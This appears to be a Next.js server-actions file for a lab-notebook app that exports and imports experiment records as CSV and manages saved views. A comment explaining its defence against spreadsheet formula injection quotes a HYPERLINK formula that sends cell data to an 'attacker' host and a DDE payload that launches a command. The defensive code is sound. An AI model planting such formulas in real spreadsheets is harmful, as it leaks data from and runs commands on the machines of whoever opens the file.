"use server";

import { revalidatePath } from "next/cache";
import { requireUser, requireWorkspace } from "@/lib/authorization/policies";
import { searchAllExperiments } from "@/lib/experiments/search";
import { listProjects } from "@/lib/projects/service";
import * as experimentsService from "@/lib/experiments/service";
import * as savedViewsService from "@/lib/saved-views/service";
import { mapCsvToInputs } from "@/lib/experiments/import";
import { toActionResult } from "@/lib/errors";
import type { ActionResult, ExperimentSearchParams, SavedView } from "@/lib/types";
import type { RowError } from "@/lib/experiments/import";

// Quote a CSV cell only when it contains a comma, quote, or newline.
//
// The leading-apostrophe branch is formula injection: Excel and Sheets
// evaluate a cell beginning =, +, -, @, tab or CR, so a scientist who types
// `=HYPERLINK("http://attacker/?d="&A1,"x")` into an observations field has
// written something that runs on whoever opens the export. It is fixed here
// rather than on import for two reasons: the import is not the only way in
// (the ordinary new/edit form accepts the same text, and every pre-existing
// row already might), and sanitising on the way in would permanently mutate
// stored scientific data.
//
// The numeric gate is what keeps this from corrupting real values. A leading
// minus is only dangerous when the cell is not a plain number: -1.5 is a
// legitimate pH and -78 a legitimate temperature, and both stay untouched,
// while `-1+cmd|'/c calc'!A0` gets the apostrophe.
function csvCell(v: unknown): string {
  let s = v == null ? "" : String(v);
  if (/^[=+\-@\t\r]/.test(s) && !Number.isFinite(Number(s))) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

// T1.6 D6 — CSV export over the *current filter*, not the current page: once
// the client only ever holds one page of rows, exporting "all wet-dry
// cycling experiments" needs its own full, unpaginated query.
export async function exportExperimentsCsvAction(params: ExperimentSearchParams): Promise<string> {
  await requireUser();
  const [rows, projects] = await Promise.all([searchAllExperiments(params), listProjects()]);
  const projectLabel = Object.fromEntries(projects.map((p) => [p.id, p.label]));

  const headers = [
    "ID", "Name", "Date", "Researcher", "Project", "Reaction type",
    "pH", "Cycles", "Compounds", "Metals", "Methods", "m/z",
    "Observations", "Notes",
  ];
  const lines = rows.map((e) =>
    [
      e.id, e.name, e.date, e.researcher,
      e.project ? projectLabel[e.project] ?? e.project : "",
      e.reaction_type, e.ph, e.cycles,
      e.compounds.join("; "), e.metals.join("; "), e.methods.join("; "),
      e.mz.join("; "), e.observations, e.notes,
    ]
      .map(csvCell)
      .join(",")
  );
  return [headers.join(","), ...lines].join("\r\n");
}

export type ImportReport = {
  /** New EXP-### ids, in file order. Empty when nothing was written. */
  created: string[];
  rowErrors: RowError[];
  /** ID-column values in the file, which imports never honour (see mapCsvToInputs). */
  ignoredIds: string[];
};

// T4.1 — the import half of the export above.
//
// All-or-nothing on validation: if any row is bad, nothing is written and
// every row's problem comes back at once. Half-importing a spreadsheet into a
// lab notebook and leaving the scientist to work out which rows landed is the
// worse failure by a distance, and the fix — edit the file, import again —
// only works if the file is still the whole truth.
//
// Rows are written one at a time on purpose: each insert draws from the
// atomic next_experiment_id() sequence and enqueues its own embedding job, and
// a serial loop is what makes "N of M were created" honest if the run dies
// partway. Every record lands as a draft (createExperiment stamps status
// 'draft'), so a partial import is recoverable by soft-deleting the drafts.
export async function importExperimentsCsvAction(csvText: string): Promise<ActionResult<ImportReport>> {
  const { supabase, user, workspaceId } = await requireWorkspace();

  const projects = await listProjects();
  const projectIdByLabel = Object.fromEntries(projects.map((p) => [p.label.toLowerCase(), p.id]));

  const mapped = mapCsvToInputs(csvText, projectIdByLabel);
  if (!mapped.ok) return { ok: false, error: mapped.error };

  const { inputs, rowErrors, ignoredIds } = mapped.mapped;
  if (rowErrors.length > 0) return { ok: true, data: { created: [], rowErrors, ignoredIds } };
  if (inputs.length === 0) return { ok: false, error: "That file has a header row but no data rows." };

  const created: string[] = [];
  try {
    for (const input of inputs) {
      // skipIndexFastPath: the durable index_jobs row is written by the DB
      // trigger regardless, so these still get embedded -- by the poller,
      // 20 at a time, instead of 500 at once against an unmetered API.
      created.push(
        await experimentsService.createExperiment(supabase, user.id, workspaceId, input, undefined, {
          skipIndexFastPath: true,
        })
      );
    }
  } catch (e) {
    const failure = toActionResult("importExperimentsCsvAction", e);
    revalidatePath("/experiments");
    return {
      ...failure,
      error: `${created.length} of ${inputs.length} rows were imported before this failed; they are drafts you can delete. ${failure.error}`,
    };
  }

  revalidatePath("/experiments");
  return { ok: true, data: { created, rowErrors, ignoredIds } };
}

export async function listViewsAction(): Promise<SavedView[]> {
  await requireUser();
  return savedViewsService.listSavedViews();
}

export async function saveViewAction(name: string, query: ExperimentSearchParams): Promise<ActionResult> {
  const { supabase, user, workspaceId } = await requireWorkspace();
  const trimmed = name.trim();
  if (!trimmed) return { ok: false, error: "Name this view before saving it." };

  try {
    await savedViewsService.createSavedView(supabase, user.id, workspaceId, trimmed, query);
  } catch (e) {
    return toActionResult("saveViewAction", e);
  }
  revalidatePath("/experiments");
  return { ok: true };
}

export async function deleteViewAction(id: string): Promise<ActionResult> {
  const { supabase } = await requireUser();
  try {
    await savedViewsService.deleteSavedView(supabase, id);
  } catch (e) {
    return toActionResult("deleteViewAction", e);
  }
  revalidatePath("/experiments");
  return { ok: true };
}
